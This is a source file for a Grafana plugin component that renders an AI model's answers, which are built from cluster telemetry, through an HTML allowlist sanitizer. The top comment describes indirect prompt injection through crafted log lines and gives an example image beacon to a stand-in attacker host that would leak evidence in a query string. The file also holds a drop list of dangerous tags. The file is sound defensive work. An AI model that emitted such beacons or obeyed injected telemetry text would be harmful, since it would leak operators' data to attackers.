import React, { useMemo } from 'react';
import { css } from '@emotion/css';
import { GrafanaTheme2, renderMarkdown, textUtil } from '@grafana/data';
import { useStyles2 } from '@grafana/ui';
import { testIds } from './testIds';

/**
 * Threat model — the dot-ai answer is UNTRUSTED INPUT.
 *
 * The answer is produced by a model whose prompt is packed with cluster telemetry: Loki
 * lines, Alertmanager annotations, Tempo spans, Kubernetes object names. Anyone who can
 * emit a log line or name a resource in a monitored cluster can put text in that prompt,
 * so a crafted log line is an indirect prompt-injection channel into whatever this
 * component renders inside an operator's authenticated Grafana session. Rendering that
 * answer as markdown is therefore an injection surface, and the payoff needs no script
 * execution: one `<img src="https://attacker/?e=...">` beacons that the panel rendered,
 * when, and — in the query string — what the evidence said.
 *
 * Grafana's own `renderMarkdown` is NOT sufficient on its own. In @grafana/data 11.4.0 it
 * routes to `sanitizeTextPanelContent`, a js-xss `FilterXSS` whitelist written for the Text
 * *panel* — content an authenticated editor typed by hand. That whitelist adds `class` and
 * `style` to every allowed tag and explicitly permits `iframe` (`src`/`width`/`height`),
 * `img src`, and `video`/`audio`. It blocks `<script>`, `on*` handlers and `javascript:`
 * URLs, so it stays as layer 1; it does not block remote embeds, so it cannot be the only
 * layer here.
 *
 * Layer 2 is `sanitizeAnswerHtml` below: an allowlist, not a denylist. An element survives
 * only if `ALLOWED_ATTRS` names it, an attribute survives only if it is named for that
 * element, and the single attribute the model can influence is `a[href]` — restricted to
 * `http(s)`/`mailto` through Grafana's own `textUtil.sanitizeUrl`. Everything else the
 * model writes is text.
 *
 * ALLOWED: block/inline structure (p, br, hr, blockquote, headings, lists, tables), inline
 * emphasis (strong, em, del), code (code, pre), and links with a vetted absolute href.
 * DENIED: all raw-HTML passthrough of anything else — no script/style/iframe/object/embed,
 * no img/video/audio/svg (no remote fetch, no beacon), no `link rel=stylesheet` (no remote
 * CSS), no `style`/`class`/`id` attributes (no UI redressing, no app-CSS reuse), no `on*`
 * handlers, no `javascript:`/`data:`/`vbscript:` URLs, no relative URLs, no form controls.
 */

/**
 * The security boundary: tag -> attributes that may survive on it.
 * A tag absent from this table is never emitted as an element.
 */
const ALLOWED_ATTRS: Readonly<Record<string, readonly string[] | undefined>> = {
  p: [],
  br: [],
  hr: [],
  blockquote: [],
  strong: [],
  em: [],
  del: [],
  code: [],
  pre: [],
  ul: [],
  ol: [],
  li: [],
  h1: [],
  h2: [],
  h3: [],
  h4: [],
  h5: [],
  h6: [],
  table: [],
  thead: [],
  tbody: [],
  tfoot: [],
  tr: [],
  th: [],
  td: [],
  a: ['href'],
};

/**
 * Cosmetic, NOT the security boundary: a disallowed tag is always removed either way.
 * This table only decides whether its text children are kept. Text inside these tags is
 * markup/binary/control content that would be noise if surfaced, so the subtree goes.
 */
const DROP_SUBTREE: Readonly<Record<string, true>> = {
  script: true,
  style: true,
  template: true,
  noscript: true,
  iframe: true,
  object: true,
  embed: true,
  applet: true,
  svg: true,
  math: true,
  canvas: true,
  link: true,
  meta: true,
  base: true,
  title: true,
  head: true,
  form: true,
  input: true,
  button: true,
  select: true,
  option: true,
  textarea: true,
  img: true,
  picture: true,
  source: true,
  video: true,
  audio: true,
  track: true,
  frame: true,
  frameset: true,
};

/** Only these schemes may ever reach an href. */
const SAFE_SCHEME = /^(?:https?|mailto):/i;

/** Marker appended to external links so the destination is visible, not just hoverable. */
export const EXTERNAL_LINK_MARKER = ' \u2197';

/**
 * Vetted href, or undefined when the anchor must be demoted to plain text.
 * `textUtil.sanitizeUrl` is Grafana's own @braintree/sanitize-url wrapper: it strips control
 * characters and collapses `javascript:`/`data:`/`vbscript:` to `about:blank`. The scheme
 * allowlist then rejects everything the URL sanitizer did not have to touch — including
 * relative URLs, which a model has no legitimate reason to emit into an answer.
 */
function safeHref(raw: string): string | undefined {
  const cleaned = textUtil.sanitizeUrl(raw.trim());
  if (!SAFE_SCHEME.test(cleaned)) {
    return undefined;
  }
  return cleaned;
}

/** True when the link leaves this Grafana origin (mailto counts as leaving). */
function isExternal(href: string): boolean {
  if (/^mailto:/i.test(href)) {
    return true;
  }
  try {
    return new URL(href).origin !== window.location.origin;
  } catch {
    return true;
  }
}

/** Replace `el` with its child nodes, keeping their order. */
function unwrap(el: Element): void {
  const parent = el.parentNode;
  if (!parent) {
    return;
  }
  while (el.firstChild) {
    parent.insertBefore(el.firstChild, el);
  }
  parent.removeChild(el);
}

function scrubElement(el: Element, doc: Document): void {
  const tag = el.tagName.toLowerCase();
  const allowed = ALLOWED_ATTRS[tag];

  if (!allowed) {
    if (DROP_SUBTREE[tag]) {
      el.remove();
    } else {
      // Recurse before unwrapping: the children move up, so scrub them in place first.
      scrubChildren(el, doc);
      unwrap(el);
    }
    return;
  }

  // Attributes: drop everything not named for this tag. This is what removes `style`,
  // `class`, `id`, `srcset`, `target`, and every `on*` handler in one pass.
  for (const attr of Array.from(el.attributes)) {
    if (!allowed.includes(attr.name.toLowerCase())) {
      el.removeAttribute(attr.name);
    }
  }

  if (tag === 'a') {
    const href = safeHref(el.getAttribute('href') ?? '');
    if (!href) {
      scrubChildren(el, doc);
      unwrap(el);
      return;
    }
    el.setAttribute('href', href);
    if (isExternal(href)) {
      el.setAttribute('rel', 'noopener noreferrer');
      el.setAttribute('target', '_blank');
      el.setAttribute('title', `External link (opens in a new tab): ${href}`);
      el.appendChild(doc.createTextNode(EXTERNAL_LINK_MARKER));
    }
  }

  scrubChildren(el, doc);
}

function scrubChildren(parent: Element, doc: Document): void {
  for (const child of Array.from(parent.children)) {
    scrubElement(child, doc);
  }
}

/**
 * Apply the allowlist to an HTML string. Exported so the unit tests can assert the boundary
 * directly, but the component below is the only production caller — and the only place in
 * this plugin that uses `dangerouslySetInnerHTML`.
 */
export function sanitizeAnswerHtml(html: string): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  scrubChildren(doc.body, doc);
  return doc.body.innerHTML;
}

/**
 * Render an untrusted dot-ai answer as markdown.
 *
 * Two layers, in order: Grafana's `renderMarkdown` (marked + the js-xss Text-panel
 * whitelist), then this plugin's allowlist. See the threat model at the top of the file.
 */
export function ResponseMarkdown({ text }: { text: string }) {
  const styles = useStyles2(getStyles);
  const html = useMemo(() => sanitizeAnswerHtml(renderMarkdown(text, { breaks: true })), [text]);
  return (
    <div
      className={styles.md}
      data-testid={testIds.dotai.answerMarkdown}
      dangerouslySetInnerHTML={{ __html: html }}
    />
  );
}

const getStyles = (theme: GrafanaTheme2) => ({
  md: css`
    color: ${theme.colors.text.primary};
    font-size: ${theme.typography.body.fontSize};
    line-height: ${theme.typography.body.lineHeight};

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      margin: ${theme.spacing(1.5, 0, 1, 0)};
      font-size: ${theme.typography.h5.fontSize};
    }

    p {
      margin: 0 0 ${theme.spacing(1)} 0;
    }

    ul,
    ol {
      margin: 0 0 ${theme.spacing(1)} 0;
      padding-left: ${theme.spacing(3)};
    }

    code {
      font-family: ${theme.typography.fontFamilyMonospace};
      font-size: ${theme.typography.bodySmall.fontSize};
      background: ${theme.colors.background.canvas};
      padding: 0 ${theme.spacing(0.5)};
    }

    pre {
      margin: 0 0 ${theme.spacing(1)} 0;
      padding: ${theme.spacing(1)};
      overflow: auto;
      background: ${theme.colors.background.canvas};
      border-radius: ${theme.shape.radius.default};

      code {
        padding: 0;
        background: none;
      }
    }

    table {
      border-collapse: collapse;
      margin-bottom: ${theme.spacing(1)};
    }

    th,
    td {
      border: 1px solid ${theme.colors.border.weak};
      padding: ${theme.spacing(0.5, 1)};
    }

    a {
      color: ${theme.colors.text.link};
    }
  `,
});
